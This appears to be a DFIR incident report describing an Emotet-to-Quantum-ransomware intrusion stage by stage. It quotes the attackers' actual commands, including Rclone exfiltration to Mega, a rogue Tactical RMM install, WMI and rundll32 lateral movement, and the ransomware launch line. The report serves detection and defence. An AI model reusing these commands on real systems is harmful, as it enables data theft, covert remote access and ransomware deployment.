Emotet Strikes Again – LNK File Leads to Domain Wide
Ransomware
thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/
November 28, 2022

In June of 2022, we observed a threat actor gaining access to an environment via Emotet
and operating over a eight day period. During this time period, multiple rounds of
enumeration and lateral movement occurred using Cobalt Strike. Remote access tools were
used for command and control, such as Tactical RMM and Anydesk. The threat actors final
actions included data exfiltration using Rclone and domain wide deployment of Quantum
Ransomware.
We have observed similar traits in previous cases where Emotet and Quantum were seen.

Case Summary
The intrusion began when a user double clicked a LNK file, which then executed encoded
Powershell commands to download an Emotet DLL onto the computer. Once executed,
Emotet setup a Registry Run Key to maintain persistence on the beachhead host.
Emotet, then proceeded to execute a short list of discover commands using the Windows
utilities systeminfo, ipconfig, and nltest targeting the network’s domain controllers. These
commands would go on to be repeated daily by the Emotet process. Around one and onehalf hours after execution, Emotet began sending spam emails, mailing new malicious
attachments to continue spreading.
Similar activity continued over the second day, but on the third day of the incident, Emotet
dropped a Cobalt Strike executable beacon onto the beachhead host. Using the Cobalt
Strike beacon, the threat actors began conducting a new round of discovery activity.
Windows net commands were run, targeting domain groups and computers, nltest was
executed again, and they also used tasklist and ping to investigate a remote host.
The threat actor then moved laterally to a workstation. They first attempted this action using
a PowerShell beacon and a remote service on the host, but while the script did execute on
the remote host, it appeared to fail to connect to the command and control server. Next, they
proceeded to transfer a beacon executable over SMB to the remote host’s ProgramData
directory. This beacon was then successfully executed via WMI and connected successfully
to the threat actors server.

1/41

Once on this new host the threat actors proceeded to run the net commands to review the
Domain Administrators group again. They then proceeded to dump credentials from the
LSASS process on the host. With some further process injection they then began to
enumerate SMB shares across the environment and on finding a primary file server reviewed
several documents present on the server. This Cobalt Strike server stopped communicating
shortly there after.
On the fourth day of the intrusion, Emotet dropped a new Cobalt Strike beacon. Again, some
net command discovery was run for domain admins and domain controller servers. A flight of
netlogon authentications were observed from the beachhead host to the domain controller as
a possible attempt at exploiting the domain controller.
The threat actors, however, proceeded along a more traditional path, using SMB file
transfers and remote services to move laterally across domain controllers and several other
servers in the environment using Cobalt Strike beacon DLL’s. On the domain controller, the
threat actors conducted further discovery tasks running find.bat and p.bat, which executed
AdFind active directory discovery and performed a ping sweep across the environment.
On one of the other targeted servers, the threat actors deployed Tactical RMM, a remote
management agent, for additional access and persistence in the environment. From this
server, the threat actors were observed using Rclone to exfiltrate data from a file share
server in the environment. The Mega.io service was the location the stolen data was sent.
On the fifth day of the intrusion, the threat actors appeared again to try and exfiltrate some
data from the mail server again using Rclone but this appeared to fail and the threat actors
did not try to resolve the issue. After this the threat actors went silent until the eighth and final
day of the intrusion.
On the eighth day of the intrusion the threat actor accessed the environment using Tactical
RMM to deploy Anydesk on the compromised host. After establishing a connection using
Anydesk, the threat actors then dropped SoftPerfect’s Network Scanner and ran it to identify
hosts across the environment.
From there, the threat actors began connecting to other hosts via RDP, including the a
backup server. After choosing a new server and connecting via RDP, the threat actors
dropped Powertool64.exe and dontsleep.exe in preparation for their final actions. Finally,
locker.dll and a batch file 1.bat were dropped on the host and the batch file was executed
beginning the Quantum rasomware deployment to all hosts over SMB. From initial intrusion
to ransomware deployment, 154 hours passed, over eight days.
After ransomware deployment, the threat actors remained connected and did RDP to a few
other servers and executed ProcessHacker.exe and a net command. With no other activity
taking place, we assess that this was likely the threat actors confirming successful
deployment of the ransomware payload across the network.

Services
We offer multiple services including a Threat Feed service which tracks Command and
Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire,
PoshC2, etc. More information on this service and others can be found here.
Both of the Cobalt Strike servers in this case were on our Threat Feed (days to months) in
advance of this intrusion.
We also have artifacts and IOCs available from this case such as pcaps, memory captures,
files, event logs including Sysmon, Kape packages, and more, under our Security
Researcher and Organization services.

Initial Access
Initial access took the form of an LNK file delivered to a victim through a MalSpam campaign.
5/41

The Powershell script embedded within the LNK is a Base64 encoded script with various
components split into different variables for obfuscation purposes. The script will decode
itself rather than depend on Powershell’s built-in ability to execute encoded scripts.

The Powershell script, when double clicked (executed), will attempt to connect to a set of
domains containing the Emotet malware. Upon successful download of the Emotet malware,
the PowerShell script will write it to a temporary directory and execute the payload via
regsvr32.exe.

It is interesting to note, the LNK identifies the machine it was created on through the
NetBIOS name of black-dog and a MAC Address beginning with 08:00:27 indicating a
system running on Virtualbox.

Machine ID: black-dog
MAC Address: 08:00:27:c6:74:5d
MAC Vendor: PCS SYSTEMTECHNIK
Creation: 2022-05-12 15:33:49
7/41

Execution
Once the PowerShell script from the LNK file executed successfully, Emotet began
execution. Emotet will initially copy itself to a randomly named folder in the users temporary
folder.

Multiple instances of Emotet spawning itself was observed over a period of three days.
Almost all the instances of Emotet included three enumeration commands executed:
systeminfo
ipconfig /all
nltest /dclist:

Towards the third and fourth day of the intrusion, Cobalt Strike was dropped to disk as a PE
executable and executed. This access was used to perform enumeration and move laterally
to other hosts.

The following diagram aims to provide an illustration of the execution chain with multiple
instances of Emotet leading to Cobalt Strike.

8/41

Persistence
The Emotet malware has used various persistence methods over time, an example can be
seen here.
On the first day, Emotet established persistence via a run key.

As we can see, the regsvr32.exe Windows’s native utility was used to launch the Emotet
DLL.

9/41

After moving to the hands on keyboard phase of the intrusion, the threat actors proceeded to
deploy several remote management tools across the environment. Tactical RMM was the
first tool chosen for deployment. Tactical RMM is a remote management software platform
that uses a combination of agents to allow for remote management and access to systems.
The file 17jun.exe, was deployed into the programdata folder on one of the servers. This
was then executed by the threat actors and resulted in the installation of the main RMM
agent. The install completed with the following command.
"C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api
https://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth
5bc5f5263224697ff9a653f8efa7e7d7a2ce341920a03c60e4823331b2508c

A service was also created for the agent.

10/41

Event 7045
A service was installed in the system.
Service Name: TacticalRMM Agent Service
Service File Name: "C:\Program Files\TacticalAgent\tacticalrmm.exe" -m svc
Service Type: user mode service
Service Start Type: auto start
Service Account: LocalSystem

Along with the tacticalrmm.exe client, a second executable called meshagent.exe, was
installed to handle remote session interaction, and a separate service was created for that
agent.

Event 7045
A service was installed in the system.
Service Name: Mesh Agent
Service File Name: "C:\Program Files\Mesh Agent\MeshAgent.exe"
Service Type: user mode service
Service Start Type: auto start
Service Account: LocalSystem

On the final day of the intrusion, the threat actors added AnyDesk to the same server running
Tactical RMM, providing an additional means of access prior to the deployment of
ransomware.
11/41

Event 7045
A service was installed in the system.
Service Name: AnyDesk Service
Service File Name: "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --service
Service Type: user mode service
Service Start Type: auto start
Service Account: LocalSystem

Privilege Escalation
We suspect a failed ZeroLogon exploit was attempted against a domain controller,
originating from the beachhead host with Cobalt Strike running on it. One indicator is the
‘mimikatz’ string in the Netlogon event that is used by the Mimikatz Zerologon
implementation.

12/41

During a period of a few seconds, multiple NetrServerReqChallenge and
NetrServerAuthenticate2 methods in the traffic from a single source were observed, this is
one of the indicators of a Zerologon attempt.

Defense Evasion
Process Injection
The threat actor was observed process injecting into legitimate process and using them to
execute their own tasks on the system, this can be seen from Winlogon connecting to a
domain associated with a Cobalt Strike server and removing files from the system.

The specific mechanism used to inject into a foreign process, was injecting arbitrary code
into its memory space, and executing it as a remotely created thread. This occurred from
rundll32.exe, which was previously used to execute and run Cobalt Strike.

The following table summarizes the processes used for injection during this case:
Injected Process Name

Injection Payload

PowerTool
PowerTool was observed, dropped and executed on the server used to deploy the
ransomware payload. This tool has the ability to kill a process, delete its process file, unload
drivers, and delete the driver files. It has been reportedly used by several ransomware
groups to aid in their operations [1][2][3][4].

As a byproduct of execution, PowerTool will drop a driver to disk and load it into the system.

Driver Signature Name: 北京华林保软件技术有限公司

Indicator Removal
The threat actor was observed deleting files that had been dropped to disk.

Credential Access
Process access to LSASS was observed, likely to dump credentials from a process that was
injected with Cobalt Strike. The Granted Access level matches know indicators for Mimikatz
with an access value of 0x1010 (4112), as we covered in a prior report.

We also observed a Cobalt Strike executable request access level of 0x0040 (64) to LSASS,
as well indicating other credential access tools may have been in use by the threat actor.

14/41

Discovery
During the initial Emotet execution, three automated discovery commands were observed.
These were then repeated, seen occurring once a day from the Emotet host.
systeminfo
ipconfig /all
nltest /dclist:

Multiple commands responsible for enumerating Active Directory groups, domain joined
computers, and domain trusts, were executed via Cobalt Strike on the beachhead.
whoami /groups
net group /domain
net group "domain computers" /domain
net group /domain "Domain controllers"
net group "domain admins" /domain
nltest /trusted_domains

The threat actor was observed querying a non-existent group Domain controller, followed
by a command correcting the mistake that queried the group Domain controllers .
net group /domain "Domain controller"
net group /domain "Domain controllers"

A ping command issued to a user workstation and a domain controller were observed
moments before lateral movement was attempted.
ping COMPUTER.REDACTED.local

Invoke-ShareFinder was observed being used via Powershell in the environment from an

injected process with Cobalt Strike:

In addition to the Invoke-ShareFinder command, other functions that were used by the
script were also observed.

The remnants of Invoke-ShareFinder could also be seen on the network through the
consistent querying of “ADMIN$” and “C$” shares for each host over a short period of time.
In addition to these shares, a few shares from the file servers were also accessed.
15/41

Once on the domain controller, two batch files were run. The first find.bat was used to run
AdFind.exe for Active Directory discovery.

find.exe -f "objectcategory=computer"
find.exe -f "(objectcategory=organizationalUnit)"
find.exe -subnets -f (objectCategory=subnet)
find.exe -f "(objectcategory=group)"
find.exe -gcb -sc trustdmp

The second script, p.bat, was run to sweep the network using ping, looking for network
connectivity and online hosts.

16/41

On the final day, prior to ransom deployment, the threat actor also dropped netscan.exe on
the server, and executed it from the Tactical RMM meshagent.exe session.
C:\Windows\System32\mstsc mstsc.exe /v:IP_ADDRESS_1
C:\Windows\System32\mstsc mstsc.exe /v:IP_ADDRESS_2
C:\Windows\SysWOW64\explorer.exe "C:\Windows\SysWOW64\explorer.exe" \\IP_ADDRESS_1\C$
C:\Windows\SysWOW64\explorer.exe "C:\Windows\SysWOW64\explorer.exe" \\IP_ADDRESS_2\C$

Lateral Movement
Cobalt Strike Remote Service Creation
The threat actor was observed creating remote services in order to execute beacon DLL files
transferred via SMB as SYSTEM on remote hosts.

17/41

C:\Windows\System32\cmd.exe /c rundll32.exe C:\ProgramData\x86.dll, StartA

WMI
In another instance, an executable Cobalt Strike beacon was copied via SMB to a target
machine, and then executed via WMI.

wmic /node:IP_Address process call create "cmd.exe /c start
C:\Progradata\sc_https_x64.exe"

Remote Desktop
Lastly, traces of RDP (Remote Desktop Protocol) connections were discovered on multiple
compromised hosts utilized for lateral movement on the final day of the intrusion and during
the ransomware deployment.

Collection
On the third day of the intrusion, after moving laterally, the threat actors began to review
sensitive documents stored on network shares, including revenue, insurance, and password
storage documents.

18/41

These documents were again reviewed by the threat actor on the final day of the intrusion.
Later the threat actor viewed the stolen files off network, observed by triggered canary
tokens, which revealed connections from an AWS EC2 instance.

Command and Control
Emotet
The Emotet loader pulled the main second stage payload from the following domains:
hxxps://descontador[.]com[.]br
hxxps://www.elaboro[.]pl
hxxps://el-energiaki[.]gr
hxxp://drechslerstammtisch[.]de
hxxp://dhnconstrucciones[.]com[.]ar
hxxp://dilsrl[.]com

The second stage loader had multiple IP addresses in its configuration to attempt
connections to:

Tactical RMM Agent
The threat actor dropped a Tactical RMM Agent on one of the servers as an alternative
command and control avenue to access the network. During the installation of the software,
the following command was observed:
"C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api

This command reveals the floppasoftware.com domain used by the threat actor for the
remote management of Tactical RMM Agent. This domain was registered very close to the
timeline of this incident.

A domain registered to be used with Tactical RMM Agent will have both an api and mesh
subdomain, in this case api.floppasoftware[.]com and mesh.floppasoftware[.]com.
These were both hosted on the same server IP: 212.73.150.62.
In addition, during the execution of Tactical RMM Agent, the software will reach out to a
centralized domain in order to retrieve the current public IP address in use:
icanhazip.tacticalrmm.io

AnyDesk
On the final day of the intrusion, AnyDesk was deployed on the server they had previously
installed Tactical RMM on. Using this RMM agent they proceeded to install AnyDesk on the
host. The following process activity was observed from meshagent.exe.
MeshAgent.exe -kvm1
- Initiating Process File Name, column 6, row 12
"MeshAgent.exe" -b64exec
cmVxdWlyZSgnd2luLWNvbnNvbGUnKS5oaWRlKCk7cmVxdWlyZSgnd2luLWRpc3BhdGNoZXInKS5jb25uZWN0KC

The decoded base 64 content reveals commands for console access and connect actions.

This is then followed by the following process flow:

Once downloaded and installed, the threat actor initiated a connection to the AnyDesk host.

Client-ID: 752733537 (FPR: 27ac27e2c9ed)
Logged in from 84.17.49.114:1249

Exfiltration
Also seen in our last report on Emotet, threat actors leveraged Rclone to exfiltrate data to
Mega (Mega.nz) storage services.

30/41

rclone.exe copy "\\SERVER.domain.name\path" mega:1 -q --ignore-existing --autoconfirm --multi-thread-streams 6 --transfers 6
rclone.exe copy "\\SERVER.domain.name\path" mega:2 -q --ignore-existing --autoconfirm --multi-thread-streams 6 --transfers 6

From the rclone.conf file, the threat actors left the details of the remote account being used.

[email protected]

With the help of Netflow, we identified that at least ~250MB worth of data was exfiltrated out
of the environment.

Impact
Spam Email
During the first two days, Emotet sent outbound spam emails over SMTP:

The following is an example of the SMTP traffic for sending the email, along with an
extracted EML that was sent with an attached XLS:

Ransomware
Towards the last day of the intrusion, the threat actor made their preparations to deploy
ransomware to the domain. They started by connecting to a new server via RDP from the
server they just used Tactical RMM to deploy Anydesk. Once establishing the RDP
connection, they deployed Powertool64.exe, likely to prevent intervention by any security
tools and launched the software Don’t Sleep.

Don’t Sleep has the capability to keep the computer from being shutdown and the user from
being signed off. This was likely done to ensure nothing will interfere with the propagation of
the ransomware payload.

32/41

Finally, with Don’t Sleep running, the threat actor executed a batch script named “1.bat“. The
script invoked the main ransomware payload, locker.dll, and passed a list of all the
computers in the domain to the target parameter.

33/41

rundll32.exe locker.dll,run /TARGET=\\HOST1.DOMAIN.NAME\C$
/TARGET=\\HOST2.DOMAIN.NAME\C$ /TARGET=\\HOST3.DOMAIN.NAME\C$
/login=DOMAIN\Administrator /password=[REDACTED] /nolog /shareall

The executable began to encrypt all the targeted hosts in the environment and dropped a
ransom note: README_TO_DECRYPT.html
34/41

After the invocation of the ransomware payload, about a minute later, the threat actor
launched Process Hacker. We believe this was to monitor the execution of the ransomware
payload.

All systems in the domain were encrypted and presented with a ransom message.

Behavioral
The threat actor delivered Emotet via a Emotet loader in the form of a LNK file
responsible for dropping Emotet via Powershell (K-1 06.13.2022.lnk).
Tactical RMM Agent was installed by the threat actor on a server to ensure remote
access (17jun.exe).
Data was exfiltrated to Mega cloud service via Rclone (rclone.exe).
Network mapping was performed using SoftPerfect Network Scanner (netscan.exe)
followed by Quantum ransomware execution and propagation in the network (locker.dll).
The threat actor kept the remote desktop session alive by running a program to keep
the session active (dontsleep.exe)
